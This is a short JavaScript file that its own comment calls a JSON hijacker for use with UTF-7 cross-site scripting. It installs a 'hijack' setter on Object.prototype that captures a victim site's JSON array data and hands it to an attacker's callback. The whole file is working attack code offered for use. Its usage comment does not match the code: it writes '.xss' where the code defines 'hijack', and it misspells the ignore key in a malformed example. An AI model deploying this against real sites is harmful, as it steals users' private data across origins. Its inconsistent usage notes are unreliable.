/* JSON hijacker intended for use with UTF-7 XSS to simplify recreating hijacked JSON.
 * Unfortunately, the sniffer only works on JSON whose root object is an array.
 * Usage: [{"a":"b"}, {"c":"d"}] as [{"a":"b"}].xss=[callback, {"__INGORE__:""}, {"c":"d"}]
 * __IGNORE__ is needed for when you inject code and there's and end quote for a string.
 */

(function () {
	"use strict";

	var ObjectCtr = Object,
	objectProto   = ObjectCtr.prototype,
	copy = function (from, to) {
		for (var prop in from) {
			if (objectProto.hasOwnProperty.call(from, prop) && prop !== "__IGNORE__") {
				to[prop] = from[prop];
			}
		}
	},
	hijackSetter = function (endHalf) {
		var
		startHalf = this,
		callback  = endHalf.shift(),
		missing   = endHalf.shift();
	
		copy(missing, startHalf[startHalf.length - 1]);
		
		callback(startHalf.concat(endHalf));
	},
	hijackProp = "hijack";
	
	if (ObjectCtr.defineProperty) {
		ObjectCtr.defineProperty(objectProto, hijackProp, {
			set: hijackSetter,
			enumerable: false,
			configurable: true
		});
	} else if (objectProto.__defineSetter__) {
		objectProto.__defineSetter__(hijackProp, hijackSetter);
	}
}());
